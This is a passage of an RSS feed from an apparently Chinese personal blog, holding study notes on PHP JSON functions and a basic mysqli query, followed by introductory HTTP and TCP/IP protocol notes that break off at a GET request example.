   &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$arr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;JSON_UNESCAPED_UNICODE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 不编码中文&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
   &lt;span class=&#34;token variable&#34;&gt;$json&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;{&#34;a&#34;:1,&#34;b&#34;:2,&#34;c&#34;:3,&#34;d&#34;:4,&#34;e&#34;:5}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

   &lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$json&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
   &lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$json&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;Mysql&#34;&gt;&lt;a href=&#34;#Mysql&#34; class=&#34;headerlink&#34; title=&#34;Mysql&#34;&gt;&lt;/a&gt;Mysql&lt;/h3&gt;&lt;p&gt;查询模块示例&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$servername&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;localhost&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;username&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;password&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$dbname&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;myDB&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;// 创建连接&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mysqli_connect&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$servername&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$dbname&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;// Check connection&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;连接失败: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mysqli_connect_error&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SELECT id, firstname, lastname FROM MyGuests&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mysqli_query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;mysqli_num_rows&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;// 输出数据&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$row&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mysqli_fetch_assoc&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;id: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;id&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34; - Name: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;firstname&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34; &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;lastname&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;0 结果&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token function&#34;&gt;mysqli_close&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;更多请看&lt;a href=&#34;https://www.runoob.com/php/php-mysql-intro.html&#34;&gt;PHP MySQL 简介 | 菜鸟教程 (runoob.com)&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;Math函数&#34;&gt;&lt;a href=&#34;#Math函数&#34; class=&#34;headerlink&#34; title=&#34;Math函数&#34;&gt;&lt;/a&gt;Math函数&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://www.runoob.com/php/php-ref-math.html&#34;&gt;PHP 5 Math 函数 | 菜鸟教程 (runoob.com)&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;HTTP函数&#34;&gt;&lt;a href=&#34;#HTTP函数&#34; class=&#34;headerlink&#34; title=&#34;HTTP函数&#34;&gt;&lt;/a&gt;HTTP函数&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://www.runoob.com/php/php-ref-http.html&#34;&gt;PHP HTTP 函数 | 菜鸟教程 (runoob.com)&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;String函数&#34;&gt;&lt;a href=&#34;#String函数&#34; class=&#34;headerlink&#34; title=&#34;String函数&#34;&gt;&lt;/a&gt;String函数&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://www.runoob.com/php/php-ref-string.html&#34;&gt;PHP 5 String 函数 | 菜鸟教程 (runoob.com)&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;Array函数&#34;&gt;&lt;a href=&#34;#Array函数&#34; class=&#34;headerlink&#34; title=&#34;Array函数&#34;&gt;&lt;/a&gt;Array函数&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://www.runoob.com/php/php-ref-array.html&#34;&gt;PHP 5 Array 函数 | 菜鸟教程 (runoob.com)&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;PDO函数&#34;&gt;&lt;a href=&#34;#PDO函数&#34; class=&#34;headerlink&#34; title=&#34;PDO函数&#34;&gt;&lt;/a&gt;PDO函数&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://www.runoob.com/php/php-pdo.html&#34;&gt;PHP PDO | 菜鸟教程 (runoob.com)&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://0xdadream.github.io/2021/04/23/http-xue-xi/</guid>
            <title>HTTP学习</title>
            <link>https://0xdadream.github.io/2021/04/23/http-xue-xi/</link>
            <category>学习</category>
            <pubDate>Fri, 23 Apr 2021 09:25:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;HTTP&#34;&gt;&lt;a href=&#34;#HTTP&#34; class=&#34;headerlink&#34; title=&#34;HTTP&#34;&gt;&lt;/a&gt;HTTP&lt;/h1&gt;&lt;h2 id=&#34;web协议&#34;&gt;&lt;a href=&#34;#web协议&#34; class=&#34;headerlink&#34; title=&#34;web协议&#34;&gt;&lt;/a&gt;web协议&lt;/h2&gt;&lt;h3 id=&#34;定义&#34;&gt;&lt;a href=&#34;#定义&#34; class=&#34;headerlink&#34; title=&#34;定义&#34;&gt;&lt;/a&gt;定义&lt;/h3&gt;&lt;p&gt;Web 使用一种名为 HTTP（HyperText Transfer Protocol，超文本传输协议 ）的协议作为规范，完成从客户端到服务器端等一系列运作流程。&lt;/p&gt;
&lt;p&gt;1997 年  1 月公布的  HTTP/1.1 是目前主流的  HTTP 协议版本。&lt;/p&gt;
&lt;h3 id=&#34;TCP-IP协议簇&#34;&gt;&lt;a href=&#34;#TCP-IP协议簇&#34; class=&#34;headerlink&#34; title=&#34;TCP/IP协议簇&#34;&gt;&lt;/a&gt;TCP/IP协议簇&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/cb757b5e4fbd69d9a7870cf73ec5f2c8.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;TCP-IP分层&#34;&gt;&lt;a href=&#34;#TCP-IP分层&#34; class=&#34;headerlink&#34; title=&#34;TCP/IP分层&#34;&gt;&lt;/a&gt;TCP/IP分层&lt;/h4&gt;&lt;h5 id=&#34;应用层&#34;&gt;&lt;a href=&#34;#应用层&#34; class=&#34;headerlink&#34; title=&#34;应用层&#34;&gt;&lt;/a&gt;应用层&lt;/h5&gt;&lt;p&gt;FTP（FileTransfer Protocol，文件传输协议）和 DNS（Domain Name System，域名系统）&lt;/p&gt;
&lt;p&gt;HTTP&lt;/p&gt;
&lt;h5 id=&#34;传输层&#34;&gt;&lt;a href=&#34;#传输层&#34; class=&#34;headerlink&#34; title=&#34;传输层&#34;&gt;&lt;/a&gt;传输层&lt;/h5&gt;&lt;p&gt;TCP（Transmission Control Protocol，传输控制协议）和 UDP（User Data Protocol，用户数据报协议）&lt;/p&gt;
&lt;h5 id=&#34;网络层&#34;&gt;&lt;a href=&#34;#网络层&#34; class=&#34;headerlink&#34; title=&#34;网络层&#34;&gt;&lt;/a&gt;网络层&lt;/h5&gt;&lt;p&gt;网络层所起的作用就是在众多的选项内选择一条传输路线&lt;/p&gt;
&lt;h5 id=&#34;物理层&#34;&gt;&lt;a href=&#34;#物理层&#34; class=&#34;headerlink&#34; title=&#34;物理层&#34;&gt;&lt;/a&gt;物理层&lt;/h5&gt;&lt;p&gt;用来处理连接网络的硬件部分&lt;/p&gt;
&lt;h4 id=&#34;TCP-IP-通信传输流&#34;&gt;&lt;a href=&#34;#TCP-IP-通信传输流&#34; class=&#34;headerlink&#34; title=&#34;TCP/IP 通信传输流&#34;&gt;&lt;/a&gt;TCP/IP 通信传输流&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/81ffdf57755cc7acedb59dfef5c70546.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;协议&#34;&gt;&lt;a href=&#34;#协议&#34; class=&#34;headerlink&#34; title=&#34;协议&#34;&gt;&lt;/a&gt;协议&lt;/h3&gt;&lt;p&gt;不同的硬件、操作系统之间的通信，所有的这一切都需要一种规则。而我们就把这种规则称为协议（protocol）。&lt;/p&gt;
&lt;h3 id=&#34;IP协议&#34;&gt;&lt;a href=&#34;#IP协议&#34; class=&#34;headerlink&#34; title=&#34;IP协议&#34;&gt;&lt;/a&gt;IP协议&lt;/h3&gt;&lt;p&gt;IP（Internet Protocol）网际协议位于网络层&lt;/p&gt;
&lt;p&gt;IP 协议的作用是把各种数据包传送给对方。&lt;/p&gt;
&lt;p&gt;P 地址指明了节点被分配到的地址，MAC 地址是指网卡所属的固定地址。IP 地址可以和 MAC 地址进行配对。IP 地址可变换，但 MAC地址基本上不会更改。&lt;/p&gt;
&lt;h3 id=&#34;ARP协议&#34;&gt;&lt;a href=&#34;#ARP协议&#34; class=&#34;headerlink&#34; title=&#34;ARP协议&#34;&gt;&lt;/a&gt;ARP协议&lt;/h3&gt;&lt;p&gt;ARP 是一种用以解析地址的协议，根据通信方的 IP 地址就可以反查出对应的 MAC 地址。&lt;/p&gt;
&lt;h4 id=&#34;路由选择&#34;&gt;&lt;a href=&#34;#路由选择&#34; class=&#34;headerlink&#34; title=&#34;路由选择&#34;&gt;&lt;/a&gt;路由选择&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/0c783c5c7eef0356ea5f3a327fb43c70.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;TCP协议&#34;&gt;&lt;a href=&#34;#TCP协议&#34; class=&#34;headerlink&#34; title=&#34;TCP协议&#34;&gt;&lt;/a&gt;TCP协议&lt;/h3&gt;&lt;p&gt;TCP 位于传输层，提供可靠的字节流服务&lt;/p&gt;
&lt;h4 id=&#34;tcp三次握手&#34;&gt;&lt;a href=&#34;#tcp三次握手&#34; class=&#34;headerlink&#34; title=&#34;tcp三次握手&#34;&gt;&lt;/a&gt;tcp三次握手&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/4fd95e6d2b8edcd965ce11295ac0c301.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;DNS&#34;&gt;&lt;a href=&#34;#DNS&#34; class=&#34;headerlink&#34; title=&#34;DNS&#34;&gt;&lt;/a&gt;DNS&lt;/h3&gt;&lt;p&gt;DNS（Domain Name System）服务是和 HTTP 协议一样位于应用层的&lt;br&gt;协议。它提供域名到 IP 地址之间的解析服务。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/9b9ebce7681849f430d21d47495b3400.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;各协议关系&#34;&gt;&lt;a href=&#34;#各协议关系&#34; class=&#34;headerlink&#34; title=&#34;各协议关系&#34;&gt;&lt;/a&gt;各协议关系&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/7e76c47328b109133df3878b6803e24a.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;URI&#34;&gt;&lt;a href=&#34;#URI&#34; class=&#34;headerlink&#34; title=&#34;URI&#34;&gt;&lt;/a&gt;URI&lt;/h3&gt;&lt;p&gt;URI 是 Uniform Resource Identifier 的缩写。&lt;/p&gt;
&lt;p&gt;URI 用字符串标识某一互联网资源，而 URL表示资源的地点（互联网上所处的位置）&lt;/p&gt;
&lt;h4 id=&#34;格式&#34;&gt;&lt;a href=&#34;#格式&#34; class=&#34;headerlink&#34; title=&#34;格式&#34;&gt;&lt;/a&gt;格式&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/48eb2105e992b313cb99eb9cb2a0e897.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;as：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;ftp&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token header-value&#34;&gt;//ftp.is.co.za/rfc/rfc1808.txt&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token header-value&#34;&gt;//www.ietf.org/rfc/rfc2396.txt&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;ldap&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token header-value&#34;&gt;//[2001:db8::7]/c=GB?objectClass?one&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;mailto&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token header-value&#34;&gt;John.Doe@example.com&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;news&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token header-value&#34;&gt;comp.infosystems.www.servers.unix&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;tel&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token header-value&#34;&gt;+1-816-555-1212&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;telnet&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token header-value&#34;&gt;//192.0.2.16:80/&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;urn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token header-value&#34;&gt;oasis:names:specification:docbook:dtd:xml:4.1.2&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;hr&gt;
&lt;h2 id=&#34;HTTP协议&#34;&gt;&lt;a href=&#34;#HTTP协议&#34; class=&#34;headerlink&#34; title=&#34;HTTP协议&#34;&gt;&lt;/a&gt;HTTP协议&lt;/h2&gt;&lt;h3 id=&#34;S-B客服端与服务器端的交互&#34;&gt;&lt;a href=&#34;#S-B客服端与服务器端的交互&#34; class=&#34;headerlink&#34; title=&#34;S-B客服端与服务器端的交互&#34;&gt;&lt;/a&gt;S-B客服端与服务器端的交互&lt;/h3&gt;&lt;p&gt;在两台计算机之间使用 HTTP 协议通信时，在一条通信线路上必定有一端是客户端，另一端则是服务器端。&lt;/p&gt;
&lt;p&gt;HTTP 是不保存状态的协议&lt;/p&gt;
&lt;h3 id=&#34;请求-响应&#34;&gt;&lt;a href=&#34;#请求-响应&#34; class=&#34;headerlink&#34; title=&#34;请求-响应&#34;&gt;&lt;/a&gt;请求-响应&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/4043823659f06850225215b355d26e70.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;请求报文是由请求方法、请求 URI、协议版本、可选的请求首部字段和内容实体构成的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/5064a6a828ab020f5558b42c2dfbdf58.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;响应报文&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/7931c23a1e3c807e44a4108e514bb99d.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;URI请求&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/84626c79794c0eb39904acbe02811cb4.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;请求方法&#34;&gt;&lt;a href=&#34;#请求方法&#34; class=&#34;headerlink&#34; title=&#34;请求方法&#34;&gt;&lt;/a&gt;请求方法&lt;/h3&gt;&lt;h4 id=&#34;GET&#34;&gt;&lt;a href=&#34;#GET&#34; class=&#34;headerlink&#34; title=&#34;GET&#34;&gt;&lt;/a&gt;GET&lt;/h4&gt;&lt;p&gt;GET ：获取资源&lt;br&gt;GET 方法用来请求访问已被 URI 识别的资源。指定的资源经服务器 端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保 持原样返回；如果是像 CGI（Common Gateway Interface，通用网关接 口）那样的程序，则返回经过执行后的输出结果。&lt;/p&gt;
&lt;p&gt;请求：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/index.html&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt; 

